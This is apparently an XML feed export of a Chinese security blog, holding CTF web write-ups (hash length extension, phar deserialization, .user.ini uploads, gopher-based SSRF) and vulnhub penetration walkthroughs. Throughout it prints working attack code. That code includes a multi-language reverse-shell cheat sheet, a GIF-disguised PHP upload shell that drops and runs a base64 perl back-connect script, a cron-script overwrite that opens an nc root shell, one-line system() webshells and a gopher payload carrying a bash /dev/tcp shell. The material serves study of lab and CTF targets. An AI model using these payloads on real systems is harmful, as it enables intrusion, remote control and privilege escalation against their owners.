$profile-&gt;is_admin();//判断是否为admin &#125;//function is_admin()function is_admin()&#123; $secret = "********"; $username = $_SESSION['username']; $password = $_SESSION['password']; if ($username == "admin" &amp;&amp; $password != "admin")&#123; if ($_COOKIE['user'] === md5($secret.$username.$password))&#123; return 1; &#125; &#125; return 0;&#125; 从代码中可看出，第一步绕过u r not admin涉及哈希长度拓展 现 $hash == md5($secret.”adminadmin”))；$hash已知、$secret长度已知，内容未知 $_COOKIE[‘user’] === md5($secret.$username.$password))；$username==admin、$password!=admin 关于哈希长度拓展的原理可参展网络教程，这里简单提一下利用方式，方便今后查阅 已知 md5($secret.”adminadmin”)) 的hash1值，但$secret未知 如果要求 md5($secret.”adminadmin”.”test”) 的hash2值，由于$secret未知，无法正向求解 但由于哈希长度拓展攻击，我们可以将已知的hash1值作为hash2值的前一个组，通过一系列变换直接算出hash2，而不需要知道$secret 为了使结果准确，需要知道$secret的长度 使用hashpump 123账户名：admin密码：admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00testCookie['user'] = bcb7fda11f22c5992de2093ed0e5a654 成功登录并进入上传处理过程 上传由于存在.htaccess文件导致任意文件无法被访问并解析，因此存在两种思路：1、上传到其他目录 2、将.htaccess文件删除或改写；显然前者因目录不可控，无法进行 12345678910111213141516171819202122232425262728293031323334353637class File&#123; public $filename; public $filepath; public $checker; function __construct($filename, $filepath) &#123; $this-&gt;filepath = $filepath; $this-&gt;filename = $filename; &#125; public function view_detail()&#123; if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this-&gt;filepath))&#123; die("nonono~"); &#125; $mine = mime_content_type($this-&gt;filepath); //unserialize $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath); $res['mine'] = $mine; $res['store_path'] = $store_path; return $res; &#125; public function open($filename, $filepath)&#123; $res = "$filename is in $filepath"; return $res; &#125; function __destruct() &#123; if (isset($this-&gt;checker))&#123; $this-&gt;checker-&gt;upload_file();//当checker不存在upload_file()，执行__get() &#125; &#125;&#125; 关注__destruct()方法，可以看到用$checker调用了此类中不存的upload_file()函数，于是想到了__call()方法，继续寻找，发现Profile类中存在可利用的__call()方法，如下： 1234567891011121314151617181920212223class Profile&#123;public $username;public $password;public $admin;public function is_admin()&#123; $this-&gt;username = $_SESSION['username']; $this-&gt;password = $_SESSION['password']; $secret = "********"; if ($this-&gt;username === "admin" &amp;&amp; $this-&gt;password != "admin")&#123; if ($_COOKIE['user'] === md5($secret.$this-&gt;username.$this-&gt;password))&#123; return 1; &#125; &#125; return 0;&#125;function __call($name, $arguments)&#123; $this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password);//若上述checker为Profile类，则执行 //admin构造成PHP内置的某个类，且需要存在open方法&#125;&#125; 发现能够使用的有一个内置类 ZipArchive-&gt;open()，构造phar文件 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass File&#123; public $filename; public $filepath; public $checker; function __construct() &#123; // $this-&gt;checker=new Admin(); $this-&gt;checker=new Profile(); &#125;&#125;class Profile&#123; public $username; public $password; public $admin; function __construct() &#123; $this-&gt;admin=new ZipArchive(); $this-&gt;username="/var/www/html/sandbox/c49aa5c1a3841904d3f07b20fec47d76/.htaccess"; $this-&gt;password=ZIPARCHIVE::OVERWRITE; &#125; function __call($name, $arguments) &#123; $this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password); &#125;&#125;$o=new File();unlink("phar.phar");$phar = new Phar("phar.phar"); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 本地上执行后，将生成的phar.phar文件上传，同时上传一个免杀后的马 123&lt;?php$a="sy"."stem";$a($_GET[0]); 访问构造的文件，触发序列化 1view.php?filename=9c7f4a2fbf2dd3dfb7051727a644d99f.phar&amp;filepath=php://filter/resource=phar://./sandbox/3f8c45add7e4722d7a34d2fea8c87504/9c7f4a2fbf2dd3dfb7051727a644d99f.phar 成功删除文件，得到flag 总结在比赛时做这道题，因为不知道哈希长度拓展卡在了第一步 第二步联想到phar反序列化以及去构造ZipArchive-&gt;open()也有一定难度 总的来说还是知识面不够宽 搜索php中某个方法：https://www.php.net/results.php?q=::open&amp;l=zh&amp;p=all phar反序列化：https://xz.aliyun.com/t/6057#toc-2 CheckIn 题目来源：SUCTF 2019 考察：.user.ini文件与PHP解析 题解访问主页为一个上传功能的网页，尝试随机上传php文件，提示：illegal suffix! 后缀改为jpg的文件，提示：exif_imagetype:not image! exif_imagetype()函数主要检测图片开头前几个字节，因此添加GIF89A绕过 再次提交提醒：&lt;? in contents!，猜测后台不允许文件内容存在&lt;?，但可通过&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;绕过 从上分析可以总结出： 不允许上传文件后缀为php 需要添加文件头绕过exif_imagetype()函数 文件内容不允许存在&lt;? 对于不允许php文件，那么可以上传.htaccess文件，但本题中并未成功解析 但可通过.user.ini来上传php后门 .user.ini类似于.htaccess，但使用范围更广泛，不仅仅支持Apache，还支持Nginx、IIS 其中auto_prepend_file=shell.bbb 意味着访问与.user.ini文件同目录的php文件，都会包含shell.bbb文件 再上传一个webshell 访问该目录下已存在的index.php文件，成功解析 1uploads/3f8c45add7e4722d7a34d2fea8c87504/index.php?cmd=cat ../../../flag 总结这道题主要考察.user.ini，参考文章： user.ini文件构成的PHP后门 从SUCTF 2019 CheckIn 浅谈.user.ini的利用 条件： 1、服务器脚本语言为PHP 2、服务器使用CGI／FastCGI模式 3、上传目录下要有可执行的php文件 相比于.htaccess文件，适用范围更广，Nginx/Apache/IIS有效 非常有必要去刷刷乌云知识库]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SolidState渗透实战]]></title>
    <url>%2F2019%2F09%2F22%2FSolidState%2F</url>
    <content type="text"><![CDATA[前言重新调整了下计划，以后每周练习一套靶机渗透 这套靶机主要提到了邮箱渗透，恰好过去没有接触，有一定收获。 渗透测试信息收集主机发现12netdiscover -r 192.168.64.0/24nmap -sn -v 192.168.64.0/24#只做主机发现，不进行端口扫描 综合扫描1nmap -A 192.168.64.137#综合扫描，包括系统探测，版本探测，脚本扫描，路由跟踪 经过发现，web服务没有额外功能，没有入手点，尝试从邮件服务器入手，同时扫描其他端口 全端口扫描1nmap -p- -sV 192.168.64.137 从结果来看，目标服务器开启了smtp、pop3等涉及邮箱服务的端口，版本信息提到JAMES，4555端口应该为JAMES远程管理员登录入口 James 是一个企业级的邮件服务器，它完全实现了smtp 和 pops 以及nntp 协议。 同时，james服务器又是一个邮件应用程序平台。 James的核心是 Mailet API ,而 james 服务其实是一个 mailet 的容器。它可以让你非常容易的实现出很强大的邮件应用程序。 James开源项目被广泛的应用于与邮件有关的项目中。你可以通过它来搭建自己的邮件服务器。我们可以利用Mailet API,编程接口来实现自己所需的业务。 邮箱渗透从Google得到，James默认账户和密码为root，使用Telnet成功连接 1telnet 192.168.64.137 4555 查询账户相关信息 当前为管理员权限，可对用户密码修改，将mindy密码修改为test 1set password mindy test 连接到pop3，查看邮件中是否存在有用信息 123456telnet 192.168.64.137 110user mindy#指定账户pass teststat#统计邮件list#枚举邮件retr 2#查看邮件2的内容 成功获得SSH登录的账号与密码 登录上发现为rbash，即受限的bash，但经过检查，此处rbash无法绕过。 compgen -c：显示当前可用命令 直接登录没有办法进行操作，想到James 2.3.2服务是否存在漏洞 1searchsploit james 将35513.py中payload行修改为反弹shell命令 运行后登陆ssh，本地得到反弹的shell，成功绕过rbash 提权下载一个枚举系统信息的脚本 1wget https://www.securitysift.com/download/linuxprivchecker.py 发现/opt/tmp.py脚本权限为777，查看源码 1234567#!/usr/bin/env pythonimport osimport systry: os.system('rm -rf /tmp/*')except: sys.exit() 将其修改掉（注：反弹的shell通常不完整，这里使用python得到交互性shell也无法直接修改） 于是直接echo将内容覆盖 1echo "#!/usr/bin/env python\nimport os\nimport sys\nos.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.64.131 8080 &gt;/tmp/f')" &gt; /opt/tmp.py 本地接受到root权限的shell 解释一下，这里之所以直接获得root权限的shell，是因为系统root用户创建了cron定时任务 后记pop3中常用命令 绕过rbashLinux Restricted Shell绕过技巧总结 反弹shell1234567891011121314151617181920212223242526272829#bash版本：bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1#perl版本:perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'#python版本：python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'#php版本：php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'#ruby版本：ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'#nc版本：nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999#java版本r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor()#lualua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DC-1渗透实战]]></title>
    <url>%2F2019%2F09%2F15%2FDC-1%2F</url>
    <content type="text"><![CDATA[前言靶机难度非常低，比较有新意的就是SUID提权。 渗透信息收集主机发现 1nmap -sn 192.168.0.0/24 端口扫描 1nmap -A 192.168.0.119 web信息 1whatweb 192.168.0.119 同时在robots.txt中也发现为Drupal7 GETSHELL由于该站点为Drupal CMS，搜索公开漏洞 1searchexploit Drupal7 成功登录到后台 进入后台后，开启PHP过滤器 添加PHP文本格式 添加一个文章，将文本格式设置为PHP，写入phpinfo()以及webshell 访问添加的文章，成功执行PHP代码 成功连接蚁剑 提权检查一下SUID文件，结果发现find存在权限 1find / -user root -perm -4000 -print 2&gt;/dev/null 查看/etc/shadow文件 将用户flag4的密码进行破解，得到密码orange 12vim hash #写入密码john --wordlist=/usr/share/john/password.lst ./hash 通过ssh登录到目标系统，并将shell转换为root shell 12ssh flag4@192.168.0.119find * -exec "/bin/sh" \; 那么此时已经提权成功，获取root目录下的flag将非常容易 总结难度非常低，在提权过程时想着使用脏牛权限提升，但编译的exp老是出错。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF Web记录(一)]]></title>
    <url>%2F2019%2F09%2F14%2FCTF%20Web%E8%AE%B0%E5%BD%95(%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[前言 CTF玩的越多发现自己越来越菜，很多脑洞和知识面不够 因此本系列文章将记录那些从中得到很大收获与感悟的CTF web题 [HCTF 2018]WarmUp 题目来源：BUUCTF 出题背景：phpmyadmin4.8.1任意文件包含漏洞 题解获取到提示hint.php：flag not here, and flag in ffffllllaaaagggg ffffllllaaaagggg并不存在于当前目录下，联想到CTF出题套路，猜测存在根目录下 获取到源码source.php 代码逻辑上看，需要绕过checkFile()函数，当其返回true时，将包含文件 在checkFile()函数中，如果file传入值存在?，那么取从开始到该?；否则取全部值作为$_page进行白名单验证 payload： 1source.php?file=hint.php?/../../../../ffffllllaaaagggg 拓展记录此题原因在于，我对这样的文件包含存在疑惑：最初在本地PHPstudy、wampserver、LAMP下，这样的文件包含方式无一成功 经过测试发现并确定，这种包含的前提是包含的文件必须是当前文件夹不存在的文件，只有这样才会将该文件解析成目录，从而遍历其他文件；此处hint.php?被解析认为是一个目录，但该目录并不存在，因此第一次../仅仅又是回到当前source.php的目录下 目录遍历 解析 ../ /var/www/html ../../ /var/www ../../../ /var ../../../../ / 此外，在Windows下hint.php?无法被解析为目录，在linux下成功认为是目录，原因为Windows系统文件命名不支持问号 Hgame2019-week2-php trick 题目来源：杭电某CTF比赛 考察：PHP常见特性 简介本例仅节选了部分内容，并简单修改方便记录。 题解12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET['str1'];$str2 = (string)@$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = @$_GET['H_game'];$url = @$_GET['url'];if( $str1 == $str2 )&#123; die('step 1 fail');&#125;if( md5($str1) != md5($str2) )&#123; die('step 2 fail');&#125;if( $str3 == $str4 )&#123; die('step 3 fail');&#125;if ( md5($str3) !== md5($str4))&#123; die('step 4 fail');&#125;if (strpos($_SERVER['QUERY_STRING'], "H_game") !==false) &#123; die('step 5 fail');&#125;if(is_numeric($str5))&#123; die('step 6 fail');&#125;if ($str5&lt;9999999999)&#123; die('step 7 fail');&#125;if ((string)$str5&gt;0)&#123; die('step 8 fial');&#125;if (parse_url($url, PHP_URL_HOST) !== "www.baidu.com")&#123; die('step 9 fail');&#125;if (parse_url($url,PHP_URL_SCHEME) !== "http")&#123; die('step 10 fail');&#125;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);$output = curl_exec($ch);curl_close($ch);if($output === FALSE)&#123; die('step 11 fail');&#125;else&#123; echo $output;&#125; 考察了几个简单的php trick md5+ php弱类型 1234567891011QNKCDZO0e830400451993494058024219903391 s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 md5、sha1不处理数组，返回false string()类型转换处理数组，返回false php在接受数据时会自动把+和.替换为_ php中数字总是比数组小 pase_url和PHP libcurl对url解析的差异 12345678完整url: scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]这里仅讨论url中不含'?'的情况php parse_url：host: 匹配最后一个@后面符合格式的hostlibcurl：host：匹配第一个@后面符合格式的host 如：http://u:p@a.com:80@b.com/ 12345678910111213php parse_url解析结果： schema: http user: u pass: p@a.com:80 host: b.com libcurl解析结果： schema: http host: a.com user: u pass: p port: 80 后面的@b.com/会被忽略掉 经过测试发现，libcurl这样的解析方式对版本存在要求，本地通过集成环境简单测试，发现 curl 7.56.0无法复现 curl 7.50.3复现成功 curl 7.38.0复现成功 curl 7.35.0以及以下复现失败 那么此处绕过方式：?url=http://@127.0.0.1:80@www.baidu.com/flag.php，必须加上端口 12345678&lt;?php//flag.phpif($_SERVER['REMOTE_ADDR'] != '127.0.0.1') &#123; die('only localhost can see it');&#125;else&#123; echo "flag&#123;this_is_flag!&#125;";&#125;?&gt; 因此，payload： 1http://192.168.1.134/ctf/test.php?str1=QNKCDZO&amp;str2=s878926199a&amp;str3[]=2&amp;str4[]=1&amp;H+game[]=123&amp;url=http://@127.0.0.1:80@www.baidu.com/ctf/flag.php easy_tornado 题目来源：2018护网杯 考察：tornado模板注入 简介谈谈自己在做的时候的疑惑和难点： 没有根据render联想到模板 不知道cookie_secret在哪里 模板注入那部分不知道tornado存在handler.settings，这个可能需要下载tornado源码查看 题解 点击flag.txt 点击welcome.txt 点击hints.txt flag在/fllllllllllllag中，可以将filename的参数值更改为fllllllllllllag，但提示出错： 可知filehash不正确，根据hint.txt，可猜测出需要获得cookie_secret，但协议中并没有cookie 联想到上面提示的render，猜测是模板注入，输入URL： 12/error?msg=&#123;&#123;1&#125;&#125; #返回1/error?msg=&#123;&#123;1*2&#125;&#125; #返回ORZ 可知对输入信息进行了过滤，但是SSTI的确存在 但跟以往的题目不同的是，这里不需要python的基类再寻找子函数，而是直接获取环境的变量 tornado框架中存在handler.setting 成功获取到cookie_secret 根据hint，得到flag flag在管理员手里 题目来源：Jarvis OJ 考察：哈希长度拓展攻击 简介关于哈希长度拓展攻击：https://xz.aliyun.com/t/2563 这道题不同的是salt长度不知，需要爆破，但该python库Windows下安装不成功，需要安装visual studio，Linux下运行脚本出错，因此直接作弊得到salt长度，手动提交 题解访问显示Only Admin can see the flag!!，抓包分析： 发现role存在序列化字符串，将guest修改为admin，没有任何变化 扫描目录发现文件：index.php~ Linux使用file index.php~，发现该文件为swp文件，修改后缀后使用vim -r恢复，得到源码 123456789101112131415161718192021222324&lt;?php $auth = false; $role = "guest"; $salt = if (isset($_COOKIE["role"])) &#123; $role = unserialize($_COOKIE["role"]); $hsh = $_COOKIE["hsh"]; if ($role==="admin" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE["role"]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; &#125; else &#123; $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); &#125; if ($auth) &#123; echo "&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo "&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"; &#125; ?&gt; 这是非常明显的哈希长度拓展攻击，要求 $role===”admin” $hsh === md5($salt.strrev($_COOKIE[“role”]) 并且现在已知： md5($salt.strrev(‘;”tseug”:5:s’)) == 3a4727d57463f122833d9e732f94e4e0 需得到md5($salt.strrev(&#39;;&quot;nimda&quot;:5:s&#39;))作为hsh提交，同时更改role为admin 和常规的题型不同的是，本例中$salt长度未知，需要进行爆破 使用python库hashpumpy hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message) 构造脚本： 需要对message进行url编码，request默认对get和post数据编码，不对cookie数据编码 1234567891011121314151617# -*- coding: utf-8 -*-import requests,hashpumpy,urllibdef webre(): #py2 url = 'http://web.jarvisoj.com:32778/' sha = '3a4727d57463f122833d9e732f94e4e0' string0 = ';"tseug":5:s' string1 = ';"nimda":5:s' for i in range(15): digest, message = hashpumpy.hashpump(sha,string0,string1,i) payload =&#123;'role':urllib.quote(message[::-1]), 'hsh':digest&#125; #payload =&#123;'role':(message[::-1]), 'hsh':digest&#125; print i,payload html = requests.get(url,cookies=payload).text#提交答案 if 'Welcome' in html: print html webre() 得到flag：Welcome Admin. Your flag is PCTF{H45h_ext3ndeR_i5_easy_to_us3} PORT51 题目来源：Jarvis OJ 考察知识点：curl 简介这道题回过头来非常简单，但的确是涉及到知识盲点 网址已经带了端口，不可能再加一个端口； 需要用curl –local-port指定本地使用一个端口去访问它 题解在公网服务器上执行：curl --local-port 51 http://web.jarvisoj.com:32770/获得flag 在本地是无法复现的，虽然本地计算机是以51端口访问，但是无法得知直接与网站发送请求的路由器是否以51号端口访问。 Login 题目来源：Jarvis OJ 考察知识点：md5($string,true) 简介主要查考MD5函数参数为true情况，结果为二进制格式 题解抓包，发现response中存在hint 关于PHP中md5函数： 1md5(string,raw) 参数 描述 string 必需。规定要计算的字符串。 raw 可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式。FALSE - 默认。32 字符十六进制数 当md5后的hex转换成字符串后，如果包含 ‘or’ 这样的字符串，那整个sql变成 1SELECT * FROM admin WHERE pass = ''or'6&lt;trash&gt;' 在MySQL中，字符串’1xxxxx’被视为’1’，于是很容易绕过 得到这样的字符串：ffifdyop =&gt; &#39;or&#39;6�]��!r,��b]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HackInOS渗透实战]]></title>
    <url>%2F2019%2F09%2F14%2FHackInOS%2F</url>
    <content type="text"><![CDATA[前言该靶机在VMware下无法运行，需virtualbox。 靶机设置相当有意思，初步涉及到内网渗透。 渗透信息收集netdiscover -r 192.168.0.0/24 nmap -A 192.168.0.115 whatweb 192.168.0.115 目录扫描出robots.txt 123User-agent:*Disallow:/upload.phpDisallow:/uploads 文件上传访问upload.php发现文件上传功能，并且发现提示： 访问404，从网络中找出源码 可看出，上传文件只允许为png和gif类型，并且需要绕过getimagesize() getimagesize()：获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息 关键点：getimagesize()是检查图片的前面16进制来检查是否为图片 绕过姿势： （1）伪造头部gif89a （2）图片马 copy 1.jpg/a+2.php/b webshell.jpg （3）十六进制编辑器直接写入命令 此处直接使用方法（1） 使用php反弹shell脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253GIF89a&lt;?php function which($pr) &#123; $path = execute("which $pr"); return ($path ? $path : $pr); &#125; function execute($cfe) &#123; $res = ''; if ($cfe) &#123; if(function_exists('exec')) &#123; @exec($cfe,$res); $res = join("\n",$res); &#125; elseif(function_exists('shell_exec')) &#123; $res = @shell_exec($cfe); &#125; elseif(function_exists('system')) &#123; @ob_start(); @system($cfe); $res = @ob_get_contents(); @ob_end_clean(); &#125; elseif(function_exists('passthru')) &#123; @ob_start(); @passthru($cfe); $res = @ob_get_contents(); @ob_end_clean(); &#125; elseif(@is_resource($f = @popen($cfe,"r"))) &#123; $res = ''; while(!@feof($f)) &#123; $res .= @fread($f,1024); &#125; @pclose($f); &#125; &#125; return $res; &#125; function cf($fname,$text)&#123; if($fp=@fopen($fname,'w')) &#123; @fputs($fp,@base64_decode($text)); @fclose($fp); &#125; &#125; $yourip = "192.168.0.113"; $yourport = '4444'; $usedb = array('perl'=&gt;'perl','c'=&gt;'c'); $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj". "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR". "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT". "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI". "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi". "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl". "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; cf('/tmp/.bc',$back_connect); $res = execute(which('perl')." /tmp/.bc $yourip $yourport &amp;"); ?&gt; 同时此处上传后的文件名是随机生成的，因此写一个小脚本列举出： 1234567import hashlibfor i in range(1,101): file_name = 'shell.php%d'%(i) md5 = hashlib.md5(file_name.encode(encoding='UTF-8')).hexdigest() with open('dir.txt','a') as f: f.writelines(md5+".php\n") 提权kali监听4444端口 dirb http://192.168.0.114:8000/uploads/ dir.txt，扫描到目标文件并触发shell 引入完整终端：python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; 先备份web源码审计： 1tar -czvf ./html/web.tar.gz ./html 在wp-config.php中发现数据库账号信息 获取系统信息 1234uname -acat /proc/version#查看suid文件find / -user root -perm -4000 -print 2&gt;/dev/null 发现/usr/bin/tail，查看/etc/shadow文件 尝试使用john破解john hash，得到密码为john 于是直接登录root，成功提权 内网 此处的内网渗透相对来说比较基础，甚至说有一点牵强，但对于认识内网渗透有一定引导作用，由于之前未接触过内网渗透，因此此处不过多涉及内网渗透的知识，之后另外学习并总结一些后渗透的姿势。 顺手查看ifconfig，发现存在内网 根据参考文章1，若想使用msf渗透内网，首先需要获得目标服务器与msf的meterpreter，再利用其它的模块展开内网攻击 反弹shell利用msf下的web_delivery模块,先 search web-delivery 1use exploit/multi/script/web_delivery 配置好相关的IP和端口，进而生成一段payload，目标执行后得到meterpreter 添加路由1use post/multi/manage/autoroute 成功添加路由后，扫描内网端口情况 端口扫描1234use auxiliary/scanner/portscan/tcpset RHOSTS 172.18.0.1-254set THREADS 10set TIMEOUT 100 此处扫描极慢，可适当调整参数，最终得到端口开放情况： 前面获取到了数据库账号信息，在服务器shell下登录mysql -h 172.18.0.3 -uwordpress -p 发现表 host_ssh_cred MD5解密后得到密码123456，直接ssh登录目标服务器 以root权限进入docker中docker run -v /:/root -i -t ubuntu /bin/bash 参考文章 【技术分享】使用 MSF 路由转发实现MSF框架的内网渗透 HackInOS渗透实战 使用msf进行反弹shell+内网渗透 文件上传漏洞之getimagesize()类型验证]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF漏洞总结]]></title>
    <url>%2F2019%2F09%2F04%2FSSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[前言因为过去学习中没有较全面的整理SSRF笔记，现重新学习并总结；由于SSRF网络教程已经很多，所以本篇大部分内容将参考网络教程，选择一部分在本地进行复现测试 关于SSRF服务端请求伪造，用户通过WEB访问/上传/发出请求，绕过服务器防火墙，获取服务器及其内网信息。SSRF可以说是一个媒介，结合服务器中的服务，常常可以形成一条完整的攻击链。 产生条件由于服务端提供了从其他服务器应用获取数据的功能且没有对用户可控的目标地址做过虑与限制。 在PHP中的curl()，file_get_contents()，fsockopen()等函数。 注：file_get_contents 情况使用 gopher 协议不能 URLencode 利用方式 演示环境为ssrf-lab，后端用curl实现 总述 可以对外网服务器所在内网/本地进行端口扫描，获取一些服务的banner信息。 攻击内网web应用（通过get传参就可以实现的攻击，如：st2,sqli等）。 利用file协议读取本地文件。 攻击fastcgi 反弹shell。 攻击redis、mysql等。 攻击运行在内网或本地的应用程序（比如溢出） file协议读取本地文件file:///etc/passwd dict协议探测端口有回显表示端口开放，无回显即端口关闭 dict://127.0.0.1:80 gopher协议 Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。 Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。 攻击内网主机假设有一台主机存在exp.php文件 12//exp.php&lt;?php system($_POST[e]);?&gt; 利用方式： 12345678POST /exp.php HTTP/1.1Host: 127.0.0.1User-Agent: curl/7.43.0Accept: */*Content-Length: 49Content-Type: application/x-www-form-urlencodede=bash -i &gt;%26 /dev/tcp/172.19.23.228/2333 0&gt;%261 构造gopher协议的url： 1gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &gt;%2526 /dev/tcp/172.19.23.228/2333 0&gt;%25261null 湖湘杯2018 123456789101112131415161718192021&lt;?php if(!isset($_GET['url']))&#123; echo "ssrf me with parameter 'url'";&#125;$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); //echo $_GET['url'];curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch); //var_dump($_POST);$ip = $_SERVER['REMOTE_ADDR'];if(isset($_POST['user']))&#123; if($_POST['user']=="admin" &amp;&amp; $ip=="127.0.0.1")&#123; system("/var/www/html/ssrf/readflag");&#125;&#125;?&gt; gopher攻击内网redis见上一篇文章：Redis漏洞利用与SSRF gopher攻击FastCGI参考https://www.jianshu.com/p/fd27f0eedccf 利用条件 libcurl版本&gt;=7.45.0(由于EXP里有%00，CURL版本小于7.45.0的版本，gopher的%00会被截断) PHP-FPM监听端口 PHP-FPM版本 &gt;= 5.3.3 知道服务器上任意一个php文件的绝对路径 转换为Gopher的EXP监听一个端口的流量 nc -lvvp 2333 &gt; 1.txt，执行EXP，流量打到2333端口 1python fpm.py -c "&lt;?php system('echo sectest &gt; /tmp/1.php'); 